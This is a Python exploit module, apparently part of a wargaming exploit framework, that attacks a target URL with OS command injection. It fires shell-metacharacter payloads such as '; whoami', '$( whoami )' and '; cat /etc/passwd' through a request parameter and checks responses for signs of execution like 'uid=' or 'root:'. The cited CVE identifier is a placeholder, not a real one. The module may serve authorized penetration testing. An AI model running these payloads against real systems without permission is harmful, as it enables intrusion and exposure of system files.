"""
Command Injection Exploit (CWE-78) - OS Command Injection.

Tests for OS command injection via shell metacharacters.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_78_command_injection"
NAME = "OS Command Injection"
DESCRIPTION = "Tests for command injection via shell metacharacters and command chaining"
CATEGORY = "command_injection"
CWE_IDS = ["CWE-78", "CWE-77"]
CVE_EXAMPLES = ["CVE-2024-CMD-001"]


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute command injection exploit.
    
    Args:
        target_url: Target application URL
        timeout: Max execution time
        **kwargs: Additional parameters
    
    Returns:
        ExploitResult with success=True if injection worked
    """
    start_time = time.time()
    output_lines = []
    
    try:
        # Command injection payloads
        payloads = [
            "; whoami",
            "| whoami",
            "` whoami `",
            "$( whoami )",
            "& whoami &",
            "; id",
            "| id",
            "; cat /etc/passwd",
        ]
        
        param_name = kwargs.get("param_name", "cmd")
        
        async with httpx.AsyncClient(timeout=timeout) as client:
            for payload in payloads:
                output_lines.append(f"Testing command injection: {payload[:30]}...")
                
                params = {param_name: payload}
                
                try:
                    response = await client.get(target_url, params=params)
                    
                    # Check for command injection indicators
                    response_text = response.text.lower()
                    
                    indicators = [
                        "uid=",
                        "gid=",
                        "root:",
                        "/bin/bash",
                        "/bin/sh",
                        "www-data",
                        "nobody",
                    ]
                    
                    for indicator in indicators:
                        if indicator in response_text:
                            duration = time.time() - start_time
                            output_lines.append(f"✓ Command injection confirmed: '{indicator}' in response")
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory(CATEGORY),
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={"payload": payload, "indicator": indicator}
                            )
                    
                    output_lines.append(f"  No indicators found")
                    
                except httpx.HTTPError as e:
                    output_lines.append(f"  HTTP error: {e}")
        
        # No injection detected
        duration = time.time() - start_time
        output_lines.append("✗ No command injection detected (likely patched)")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.FAILED,
            success=False,
            output="\n".join(output_lines),
            error=None,
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
        
    except asyncio.TimeoutError:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Timeout",
            duration_seconds=duration,
            metadata={}
        )
    
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=duration,
            metadata={}
        )
